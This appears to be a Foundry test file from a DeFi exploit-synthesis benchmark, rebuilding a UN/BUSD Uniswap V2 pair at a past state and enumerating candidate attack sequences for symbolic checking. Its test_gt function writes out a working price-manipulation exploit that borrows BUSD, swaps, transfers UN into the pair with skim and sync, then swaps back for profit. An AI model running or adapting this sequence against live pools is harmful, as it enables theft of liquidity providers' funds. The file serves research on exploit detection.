// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BUSD} from "@utils/BUSD.sol";
import {UN} from "./UN.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract UNTest is Test, BlockLoader {
    BUSD busd;
    UN un;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address busdAddr;
    address unAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1686054153;
    uint112 reserve0pair = 186912581853851065964787;
    uint112 reserve1pair = 30265800773605712024588;
    uint32 blockTimestampLastpair = 1686054150;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 793211419009633925562963933367047369;
    uint256 price1CumulativeLastpair = 1986201436305674573380946799582736123659;
    uint256 totalSupplybusd = 3379997906401637314353418735;
    uint256 balanceOfbusdpair = 30265800773605712024588;
    uint256 balanceOfbusdattacker = 0;
    uint256 totalSupplyun = 10000000000000000000000000;
    uint256 balanceOfunpair = 186912581853851065964787;
    uint256 balanceOfunattacker = 0;

    function setUp() public {
        owner = address(this);
        busd = new BUSD();
        busdAddr = address(busd);
        un = new UN();
        unAddr = address(un);
        pair = new UniswapV2Pair(
            address(un),
            address(busd),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        busd.transfer(address(pair), balanceOfbusdpair);
        un.transfer(address(pair), balanceOfunpair);
        un.setSwapPair(address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Busd Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(busd),
            busd.decimals()
        );
        queryERC20BalanceDecimals(address(un), address(busd), un.decimals());
        emit log_string("");
        emit log_string("Un Balances: ");
        queryERC20BalanceDecimals(address(busd), address(un), busd.decimals());
        queryERC20BalanceDecimals(address(un), address(un), un.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(pair),
            busd.decimals()
        );
        queryERC20BalanceDecimals(address(un), address(pair), un.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(attacker),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(un),
            address(attacker),
            un.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
    }

    function borrow_busd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_owner(uint256 amount) internal eurus {
        busd.transfer(owner, amount);
    }

    function borrow_un_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        un.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_un_owner(uint256 amount) internal eurus {
        un.transfer(owner, amount);
    }

    function swap_pair_attacker_un_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        un.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_busd_un(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_un_pair(uint256 amount) internal eurus {
        un.transfer(address(pair), amount);
        pair.skim(attacker);
        pair.sync();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_un(amt1, amt2);
        swap_pair_attacker_un_busd(amt3, amt4);
        payback_busd_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        burn_un_pair(amt1);
        swap_pair_attacker_busd_un(amt2, amt3);
        swap_pair_attacker_un_busd(amt4, amt5);
        payback_busd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_un(amt1, amt2);
        burn_un_pair(amt3);
        swap_pair_attacker_un_busd(amt4, amt5);
        payback_busd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_un_owner(amt0);
        swap_pair_attacker_un_busd(amt1, amt2);
        swap_pair_attacker_busd_un(amt3, amt4);
        payback_un_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_un_owner(amt0);
        burn_un_pair(amt1);
        swap_pair_attacker_un_busd(amt2, amt3);
        swap_pair_attacker_busd_un(amt4, amt5);
        payback_un_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_un_owner(amt0);
        swap_pair_attacker_un_busd(amt1, amt2);
        burn_un_pair(amt3);
        swap_pair_attacker_busd_un(amt4, amt5);
        payback_un_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_un(amt1, amt2);
        swap_pair_attacker_un_busd(amt3, amt4);
        swap_pair_attacker_busd_un(amt5, amt6);
        swap_pair_attacker_un_busd(amt7, amt8);
        payback_busd_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_busd_owner(amt0);
        burn_un_pair(amt1);
        swap_pair_attacker_busd_un(amt2, amt3);
        swap_pair_attacker_un_busd(amt4, amt5);
        swap_pair_attacker_busd_un(amt6, amt7);
        swap_pair_attacker_un_busd(amt8, amt9);
        payback_busd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_un(amt1, amt2);
        burn_un_pair(amt3);
        swap_pair_attacker_un_busd(amt4, amt5);
        swap_pair_attacker_busd_un(amt6, amt7);
        swap_pair_attacker_un_busd(amt8, amt9);
        payback_busd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_un(amt1, amt2);
        swap_pair_attacker_un_busd(amt3, amt4);
        burn_un_pair(amt5);
        swap_pair_attacker_busd_un(amt6, amt7);
        swap_pair_attacker_un_busd(amt8, amt9);
        payback_busd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_un(amt1, amt2);
        swap_pair_attacker_un_busd(amt3, amt4);
        swap_pair_attacker_busd_un(amt5, amt6);
        burn_un_pair(amt7);
        swap_pair_attacker_un_busd(amt8, amt9);
        payback_busd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_un_owner(amt0);
        swap_pair_attacker_un_busd(amt1, amt2);
        swap_pair_attacker_busd_un(amt3, amt4);
        swap_pair_attacker_un_busd(amt5, amt6);
        swap_pair_attacker_busd_un(amt7, amt8);
        payback_un_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_un_owner(amt0);
        burn_un_pair(amt1);
        swap_pair_attacker_un_busd(amt2, amt3);
        swap_pair_attacker_busd_un(amt4, amt5);
        swap_pair_attacker_un_busd(amt6, amt7);
        swap_pair_attacker_busd_un(amt8, amt9);
        payback_un_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_un_owner(amt0);
        swap_pair_attacker_un_busd(amt1, amt2);
        burn_un_pair(amt3);
        swap_pair_attacker_busd_un(amt4, amt5);
        swap_pair_attacker_un_busd(amt6, amt7);
        swap_pair_attacker_busd_un(amt8, amt9);
        payback_un_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_un_owner(amt0);
        swap_pair_attacker_un_busd(amt1, amt2);
        swap_pair_attacker_busd_un(amt3, amt4);
        burn_un_pair(amt5);
        swap_pair_attacker_un_busd(amt6, amt7);
        swap_pair_attacker_busd_un(amt8, amt9);
        payback_un_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_un_owner(amt0);
        swap_pair_attacker_un_busd(amt1, amt2);
        swap_pair_attacker_busd_un(amt3, amt4);
        swap_pair_attacker_un_busd(amt5, amt6);
        burn_un_pair(amt7);
        swap_pair_attacker_busd_un(amt8, amt9);
        payback_un_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 29100 * 1e18);
        borrow_busd_owner(29100 * 1e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", busd.balanceOf(attacker));
        emit log_named_uint("amt2", 91480714664455701397200);
        swap_pair_attacker_busd_un(
            busd.balanceOf(attacker),
            91480714664455701397200
        );
        printBalance("After step1 ");
        emit log_named_uint("amt3", (un.balanceOf(attacker) * 93) / 100);
        burn_un_pair((un.balanceOf(attacker) * 93) / 100);
        printBalance("After step2 ");
        emit log_named_uint("amt4", un.balanceOf(attacker));
        emit log_named_uint("amt5", 3 * 1e22);
        swap_pair_attacker_un_busd(un.balanceOf(attacker), 3 * 1e22);
        printBalance("After step3 ");
        emit log_named_uint("amt6", (29100 * 1e18 * 1003) / 1000);
        payback_busd_owner((29100 * 1e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_un(amt1, amt2);
        burn_un_pair(amt3);
        swap_pair_attacker_un_busd(amt4, amt5);
        payback_busd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
